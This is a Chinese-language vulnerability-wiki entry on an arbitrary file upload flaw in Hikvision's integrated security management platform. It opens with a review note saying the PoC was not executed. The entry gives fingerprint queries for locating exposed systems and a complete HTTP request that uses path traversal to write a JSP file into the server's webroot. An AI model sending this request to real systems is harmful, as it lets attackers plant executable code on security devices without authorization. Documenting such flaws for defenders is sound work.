---
source: "Threekiii/Vulnerability-Wiki"
id: "vw-35c6b6f4d405a963b74bc9ce"
entity_id: "ve-35c6b6f4d405a963b74bc9ce"
schema_version: "1"
title: "Hikvision 综合安防管理平台 files 任意文件上传漏洞"
product: "Hikvision综合安防运行管理中心"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "明确管理中心8001开放；Linux/Tomcat路径，版本不明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/HIKVISION-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files/HIKVISION-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-files-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_status: "unknown"
canonical: "Web安全/智能设备/HIKVISION-综合安防管理平台-files/HIKVISION-综合安防管理平台-files-任意文件上传漏洞.md"
---

# Hikvision 综合安防管理平台 files 任意文件上传漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision综合安防运行管理中心
- 本文讨论：center/api/files;.html filename越界上传
- 版本、权限与配置前提：明确管理中心8001开放；Linux/Tomcat路径，版本不明
- 资料类型：管理中心上传路径穿越PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 需文件系统目录/写权限和JSP执行，示例只上传无访问验证文本
- 分号后缀作用/auth绕过未解释，无官方补丁
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 鉴权/后缀解析、实际安装路径及版本待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

Hikvision 综合安防管理平台 files 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件

## 漏洞影响

Hikvision 综合安防管理平台

## 网络测绘

```
app="Hikvision-综合安防管理平台"
```

```
web.title=="综合安防管理平台"
```

## 漏洞复现

登陆页面

![image-20220824134144287](./.resource/HIKVISION-综合安防管理平台-files-任意文件上传漏洞/media/202208241341481.png)

需要开放运行管理中心 (8001端口)

![image-20230828163622054](./.resource/HIKVISION-综合安防管理平台-files-任意文件上传漏洞/media/image-20230828163622054.png)

```http
POST /center/api/files;.html HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/Hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%out.print("test3");%>

------WebKitFormBoundary9PggsiM755PLa54a--
```

![image-20230828163639195](./.resource/HIKVISION-综合安防管理平台-files-任意文件上传漏洞/media/image-20230828163639195.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
